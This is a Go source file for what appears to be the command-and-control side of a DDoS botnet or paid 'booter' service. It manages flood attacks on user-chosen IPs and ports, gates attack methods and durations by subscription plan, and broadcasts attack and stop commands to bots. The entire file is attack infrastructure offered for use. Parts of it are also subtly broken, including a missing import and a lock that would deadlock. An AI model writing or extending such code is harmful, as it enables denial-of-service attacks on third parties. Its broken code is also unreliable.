package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// Attack structure
type Attack struct {
	ID        int       `json:"id"`
	Target    string    `json:"target"`
	Port      int       `json:"port"`
	Method    string    `json:"method"`
	Duration  int       `json:"duration"`
	Threads   int       `json:"threads"`
	User      string    `json:"user"`
	Started   time.Time `json:"started"`
	Expires   time.Time `json:"expires"`
	Remaining int       `json:"remaining"`
	Status    string    `json:"status"` // running, finished, stopped
}

// AttackManager handles all attack operations
type AttackManager struct {
	Attacks    map[int]*Attack
	Mutex      sync.RWMutex
	Filename   string
	IDCounter  int
}

// Global attack manager
var attackManager = &AttackManager{
	Attacks:   make(map[int]*Attack),
	Filename:  "data/attacks.json",
	IDCounter: 0,
}

// Load attacks from file
func (am *AttackManager) Load() error {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	file, err := os.ReadFile(am.Filename)
	if err != nil {
		if os.IsNotExist(err) {
			// Create empty file
			am.saveToFile()
			return nil
		}
		return err
	}

	var attacks []*Attack
	if err := json.Unmarshal(file, &attacks); err != nil {
		return err
	}

	am.Attacks = make(map[int]*Attack)
	maxID := 0
	for _, attack := range attacks {
		am.Attacks[attack.ID] = attack
		if attack.ID > maxID {
			maxID = attack.ID
		}
	}
	am.IDCounter = maxID + 1

	return nil
}

// Save attacks to file
func (am *AttackManager) saveToFile() error {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	var attacks []*Attack
	for _, attack := range am.Attacks {
		attacks = append(attacks, attack)
	}

	data, err := json.MarshalIndent(attacks, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(am.Filename, data, 0644)
}

// Add a new attack
func (am *AttackManager) Add(target string, port int, method string, duration int, threads int, user string) int {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	id := am.IDCounter
	am.IDCounter++

	now := time.Now()
	attack := &Attack{
		ID:        id,
		Target:    target,
		Port:      port,
		Method:    method,
		Duration:  duration,
		Threads:   threads,
		User:      user,
		Started:   now,
		Expires:   now.Add(time.Duration(duration) * time.Second),
		Remaining: duration,
		Status:    "running",
	}

	am.Attacks[id] = attack
	am.saveToFile()

	// Start countdown timer
	go am.countdownTimer(id)

	return id
}

// Countdown timer for attack
func (am *AttackManager) countdownTimer(id int) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		am.Mutex.Lock()
		attack, exists := am.Attacks[id]
		if !exists {
			am.Mutex.Unlock()
			return
		}

		if attack.Status == "stopped" || attack.Status == "finished" {
			am.Mutex.Unlock()
			return
		}

		remaining := int(time.Until(attack.Expires).Seconds())
		if remaining <= 0 {
			attack.Status = "finished"
			attack.Remaining = 0
			am.saveToFile()
			am.Mutex.Unlock()
			return
		}

		attack.Remaining = remaining
		am.saveToFile()
		am.Mutex.Unlock()
	}
}

// Get attack by ID
func (am *AttackManager) Get(id int) *Attack {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	return am.Attacks[id]
}

// Get all attacks
func (am *AttackManager) GetAll() []*Attack {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	var attacks []*Attack
	for _, attack := range am.Attacks {
		attacks = append(attacks, attack)
	}
	return attacks
}

// Get attacks by user
func (am *AttackManager) GetByUser(username string) []*Attack {
	am.Mutex.RLock()
	defer am.Mutex.RUnlock()

	var attacks []*Attack
	for _, attack := range am.Attacks {
		if attack.User == username {
			attacks = append(attacks, attack)
		}
	}
	return attacks
}

// Stop attack by ID
func (am *AttackManager) Stop(id int) bool {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	attack, exists := am.Attacks[id]
	if !exists {
		return false
	}

	attack.Status = "stopped"
	am.saveToFile()
	return true
}

// Stop all attacks for a user
func (am *AttackManager) StopAll(user string) int {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	count := 0
	for id, attack := range am.Attacks {
		if attack.User == user && attack.Status == "running" {
			attack.Status = "stopped"
			count++
		}
	}
	am.saveToFile()
	return count
}

// Clean finished attacks (older than 1 hour)
func (am *AttackManager) Clean() {
	am.Mutex.Lock()
	defer am.Mutex.Unlock()

	now := time.Now()
	for id, attack := range am.Attacks {
		if attack.Status == "finished" && now.Sub(attack.Expires) > time.Hour {
			delete(am.Attacks, id)
		}
		if attack.Status == "stopped" && now.Sub(attack.Started) > time.Hour {
			delete(am.Attacks, id)
		}
	}
	am.saveToFile()
}

// Start cleaner goroutine
func (am *AttackManager) StartCleaner() {
	ticker := time.NewTicker(10 * time.Minute)
	go func() {
		for range ticker.C {
			am.Clean()
		}
	}()
}

// ==================== ATTACK FUNCTIONS FOR MAIN.GO ====================

// startAttack - handle attack command
func startAttack(conn net.Conn, method, target, port, duration, threads, username string) {
	// Validate method
	if !isMethodAllowed(username, method) {
		conn.Write([]byte("\n[!] Method not allowed for your plan.\n"))
		conn.Write([]byte("    VIP - All methods\n"))
		conn.Write([]byte("    PREMIUM - Most methods (no GRE/DNS)\n"))
		conn.Write([]byte("    USER - UDP/TCP/SYN only\n\n"))
		return
	}

	// Validate port
	portNum, err := strconv.Atoi(port)
	if err != nil || portNum < 1 || portNum > 65535 {
		conn.Write([]byte("\n[!] Invalid port. Must be 1-65535.\n\n"))
		return
	}

	// Validate duration
	durationNum, err := strconv.Atoi(duration)
	if err != nil || durationNum < 1 {
		conn.Write([]byte("\n[!] Invalid duration.\n\n"))
		return
	}

	// Check max duration per plan
	maxDur := getMaxDuration(username)
	if durationNum > maxDur {
		conn.Write([]byte(fmt.Sprintf("\n[!] Max duration for your plan is %ds.\n\n", maxDur)))
		return
	}

	// Validate threads
	threadsNum, err := strconv.Atoi(threads)
	if err != nil || threadsNum < 1 || threadsNum > 1000 {
		conn.Write([]byte("\n[!] Invalid threads. Must be 1-1000.\n\n"))
		return
	}

	// Increment attack count
	if !incrementAttacks(username) {
		conn.Write([]byte("\n[!] Daily attack limit reached.\n\n"))
		return
	}

	// Add attack to manager
	attackManager.Load()
	id := attackManager.Add(target, portNum, method, durationNum, threadsNum, username)

	// Broadcast to bots
	broadcastAttack(method, target, portNum, durationNum, threadsNum)

	// Show attack details
	conn.Write([]byte("\n[Attack Launched!]\n"))
	conn.Write([]byte(" Target: " + target + "\n"))
	conn.Write([]byte(" Port: " + port + "\n"))
	conn.Write([]byte(" Method: ." + strings.ToUpper(method) + "\n"))
	conn.Write([]byte(" Duration: " + duration + "s\n"))
	conn.Write([]byte(" Threads: " + threads + "\n"))
	conn.Write([]byte(" Attack ID: " + strconv.Itoa(id) + "\n\n"))
}

// showAttacks - display active attacks
func showAttacks(conn net.Conn) {
	attackManager.Load()
	attacks := attackManager.GetAll()

	if len(attacks) == 0 {
		conn.Write([]byte("\nNo active attacks.\n\n"))
		return
	}

	// Count active
	active := 0
	for _, a := range attacks {
		if a.Status == "running" {
			active++
		}
	}

	if active == 0 {
		conn.Write([]byte("\nNo active attacks.\n\n"))
		return
	}

	conn.Write([]byte(fmt.Sprintf("\nActive Attacks: %d\n", active)))
	conn.Write([]byte("  IP            Port  Method   Left  Threads  User\n"))
	conn.Write([]byte("  -------------------------------------------------\n"))

	for _, a := range attacks {
		if a.Status != "running" {
			continue
		}
		left := ""
		if a.Remaining > 0 {
			left = fmt.Sprintf("%ds", a.Remaining)
		} else {
			left = "done"
		}
		conn.Write([]byte(fmt.Sprintf("  %-14s %-5d %-8s %-5s %-7d %s\n",
			a.Target, a.Port, "."+strings.ToUpper(a.Method), left, a.Threads, a.User)))
	}

	conn.Write([]byte("\n"))
}

// showUserAttacks - display attacks for specific user
func showUserAttacks(conn net.Conn, username string) {
	attackManager.Load()
	attacks := attackManager.GetByUser(username)

	if len(attacks) == 0 {
		conn.Write([]byte("\nNo attacks found.\n\n"))
		return
	}

	conn.Write([]byte(fmt.Sprintf("\nYour Attacks: %d\n", len(attacks))))
	conn.Write([]byte("  ID  Target        Port  Method   Status    Left\n"))
	conn.Write([]byte("  -----------------------------------------------\n"))

	for _, a := range attacks {
		left := ""
		if a.Status == "running" && a.Remaining > 0 {
			left = fmt.Sprintf("%ds", a.Remaining)
		} else if a.Status == "running" {
			left = "ending"
		} else {
			left = a.Status
		}
		conn.Write([]byte(fmt.Sprintf("  %-3d %-12s %-5d %-8s %-9s %s\n",
			a.ID, a.Target, a.Port, "."+strings.ToUpper(a.Method), a.Status, left)))
	}

	conn.Write([]byte("\n"))
}

// stopAttack - stop an attack
func stopAttack(conn net.Conn, id int, username string, isAdmin bool) {
	attackManager.Load()
	attack := attackManager.Get(id)

	if attack == nil {
		conn.Write([]byte(fmt.Sprintf("\n[!] Attack ID %d not found.\n\n", id)))
		return
	}

	// Check if user owns the attack or is admin
	if attack.User != username && !isAdmin {
		conn.Write([]byte("\n[!] You can only stop your own attacks.\n\n"))
		return
	}

	if attack.Status != "running" {
		conn.Write([]byte(fmt.Sprintf("\n[!] Attack ID %d is not running.\n\n", id)))
		return
	}

	if attackManager.Stop(id) {
		// Send stop command to bots
		broadcastStop(id)
		conn.Write([]byte(fmt.Sprintf("\n[+] Attack ID %d stopped.\n\n", id)))
	} else {
		conn.Write([]byte(fmt.Sprintf("\n[!] Failed to stop attack ID %d.\n\n", id)))
	}
}

// stopAllAttacks - stop all attacks for user
func stopAllAttacks(conn net.Conn, username string, isAdmin bool) {
	attackManager.Load()

	var count int
	if isAdmin {
		// Admin can stop all attacks
		attacks := attackManager.GetAll()
		for _, a := range attacks {
			if a.Status == "running" {
				attackManager.Stop(a.ID)
				count++
			}
		}
	} else {
		count = attackManager.StopAll(username)
	}

	if count > 0 {
		broadcastStopAll(username)
		conn.Write([]byte(fmt.Sprintf("\n[+] Stopped %d attacks.\n\n", count)))
	} else {
		conn.Write([]byte("\n[!] No running attacks to stop.\n\n"))
	}
}

// broadcastAttack - send attack to all bots
func broadcastAttack(method, target string, port, duration, threads int) {
	msg := fmt.Sprintf("%s %s %d %d %d", method, target, port, duration, threads)
	broadcastToBots(msg)
}

// broadcastStop - send stop command to bots
func broadcastStop(id int) {
	broadcastToBots(fmt.Sprintf("STOP %d", id))
}

// broadcastStopAll - send stop all command to bots
func broadcastStopAll(user string) {
	broadcastToBots(fmt.Sprintf("STOPALL %s", user))
}

// getAttack - get attack by ID (exported)
func getAttack(id int) *Attack {
	attackManager.Load()
	return attackManager.Get(id)
}